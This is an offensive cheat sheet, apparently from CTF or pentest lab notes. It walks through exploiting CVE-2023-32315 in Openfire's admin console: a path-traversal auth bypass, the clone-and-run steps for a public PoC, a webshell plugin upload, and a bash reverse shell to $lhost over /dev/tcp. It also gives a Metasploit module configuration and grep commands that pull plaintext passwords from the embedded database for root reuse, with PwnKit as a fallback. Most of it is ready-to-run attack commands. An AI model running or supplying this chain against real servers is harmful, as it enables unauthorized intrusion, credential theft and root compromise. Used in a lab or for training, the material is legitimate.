title: Openfire XMPP Admin — CVE-2023-32315 Auth Bypass → RCE
body:
Openfire is a Java XMPP chat server. Its admin console runs on 9090 (HTTP) and 9091 (HTTPS). Versions 3.10.0–4.7.4 have CVE-2023-32315: a path-traversal auth bypass that lets you reach setup/admin pages without logging in, create an admin user, then upload a malicious plugin (.jar) for RCE as the openfire service user.

Fingerprint: nmap shows 'Apache Hadoop' on 9090/9091 (false positive — it's Openfire), login portal titled Openfire, version in the admin console footer. The auth-bypass test URL returning the log page confirms vulnerability before you even run the exploit.

Critical follow-up: after you get the openfire user shell, the intended privesc is almost always credential reuse — grep the Openfire data directory for passwords and try them for root. The embedded DB stores plaintext property values.
cmd:
# ══════════════════════════════════════════════════
# IDENTIFY
# ══════════════════════════════════════════════════
# nmap often mislabels 9090/9091 as 'Apache Hadoop' — it's Openfire.
# Admin console: http://$ip:9090  → login portal says Openfire
# Version in footer of login page (e.g. 4.7.3)

# Confirm CVE-2023-32315 WITHOUT the exploit — auth bypass test URL:
# Browse to:
#   http://$ip:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
# If the log page loads (not a redirect to setup), it's VULNERABLE.
# Vulnerable range: 3.10.0 - 4.7.4

# ══════════════════════════════════════════════════
# EXPLOIT — miko550 PoC (creates admin + uploads plugin)
# ══════════════════════════════════════════════════
git clone https://github.com/miko550/CVE-2023-32315.git
cd CVE-2023-32315
pip install -r requirements.txt   # use a venv if PEP668 blocks it

python3 CVE-2023-32315.py -t http://$ip:9090
# The exploit:
#   1. Abuses path traversal to reach the user-create page unauthenticated
#   2. Creates a temp admin account (prints the creds it made)
#   3. You then log in and upload the malicious plugin manually (see below)

# ── Manual plugin upload for RCE ──────────────────
# The repo includes openfire-management-tool-plugin.jar (a webshell plugin).
# 1. Log into http://$ip:9090 with the admin creds the exploit created
# 2. Plugins → Upload Plugin → select openfire-management-tool-plugin.jar
# 3. Browse to: http://$ip:9090/plugins/openfire-management-tool/cmd.jsp
#    (password for the plugin shell is often '123' — check the repo README)
# 4. Run commands as the openfire user

# ── Reverse shell from the plugin webshell ────────
# In the cmd.jsp shell, run a bash reverse shell:
#   bash -c 'bash -i >& /dev/tcp/$lhost/6666 0>&1'
# nc -nlvp 6666 on Kali, then upgrade:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm-256color

# ══════════════════════════════════════════════════
# FASTER — METASPLOIT MODULE (auto: admin + plugin + shell)
# ══════════════════════════════════════════════════
# msf6 > use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
# msf6 > set RHOSTS $ip
# msf6 > set LHOST $lhost
# msf6 > exploit
# Auto-creates admin, uploads plugin, returns a shell as openfire.
# NOTE: it leaves the admin user + plugin behind — clean up manually
# via the admin console (or note it in your report).

# ══════════════════════════════════════════════════
# PRIVESC — CREDENTIAL REUSE (the intended path)
# ══════════════════════════════════════════════════
# You're the 'openfire' user. SUIDs may show pkexec (PwnKit works as a
# fallback), but the DESIGNED path is looting Openfire's own data dir.
# The embedded DB stores plaintext property values including passwords:

# ── PATH A: reveal the SMTP password in the ADMIN UI ──
# Log into the console (exploit-created creds) → Server → Email Settings.
# The SMTP config shows username 'root' and a MASKED password field.
# Reveal it: open browser DevTools (F12), find the password <input>,
# change type="password" to type="text" → the value shows in plaintext.
# (This masked-field trick works on ANY admin panel, not just Openfire.)

# ── PATH B: grep the embedded DB (the reliable CLI way) ──
# The plaintext lands in the .log (recent changes) AND the .script:
grep -i -E 'smtp|password' /var/lib/openfire/embedded-db/openfire.log
grep -i -E 'smtp|password' /var/lib/openfire/embedded-db/openfire.script
# You'll see, in plaintext:
#   INSERT INTO OFPROPERTY VALUES('mail.smtp.username','root',0,NULL)
#   INSERT INTO OFPROPERTY VALUES('mail.smtp.password','<PLAINTEXT>',0,NULL)
# Catch-all if you don't know the exact file:
grep -r -i password /var/lib/openfire

# NOTE: the admin UI may show a password HASH for SMTP that WON'T crack —
# the embedded-db .log/.script holds the PLAINTEXT. Always check the DB,
# not just the UI hash.

# Try EVERY plaintext value found as the root SSH/su password:
ssh root@$ip          # try each grep'd password
su root               # from the openfire shell

# On Fired box: 'mail.smtp.password' value = the root password. Reuse win.

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# Exploit says created admin but login fails:
#   → Some versions need the exact traversal URL — re-test the log.jsp URL
#   → Try the K3ysTr0K3R PoC as an alternative:
#     github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

# Plugin uploads but cmd.jsp 404s:
#   → Plugin name in URL must match the .jar — check exact path in repo README
#   → Give it 10-20s after upload for Openfire to unpack the plugin

# grep finds passwords but root SSH fails:
#   → Root SSH may be disabled — use 'su root' from the openfire shell instead
#   → Try the passwords for OTHER local users too (cat /etc/passwd for names)
warn: nmap mislabels Openfire's 9090/9091 as 'Apache Hadoop' — don't chase Hadoop exploits, it's Openfire. Confirm the CVE with the log.jsp traversal URL in a browser BEFORE running the exploit — instant confirmation, no tooling. After foothold, always 'grep -r password /var/lib/openfire' BEFORE reaching for a kernel/SUID exploit — the embedded DB (/var/lib/openfire/embedded-db/openfire.log AND openfire.script) stores plaintext passwords reused for root on nearly every Openfire lab box. The admin UI may show only a HASH that won't crack — the .log/.script hold the PLAINTEXT, so always check the DB files. Tip: reveal any masked password field in an admin panel by changing the HTML input type from 'password' to 'text' in DevTools. The plugin webshell password is often a trivial default ('123') set in the PoC — check the repo README.

choices.label: Got openfire shell — hunt creds in the data dir
Found a password — try it for root (su/ssh)
Creds didn't reuse — try PwnKit (pkexec SUID)
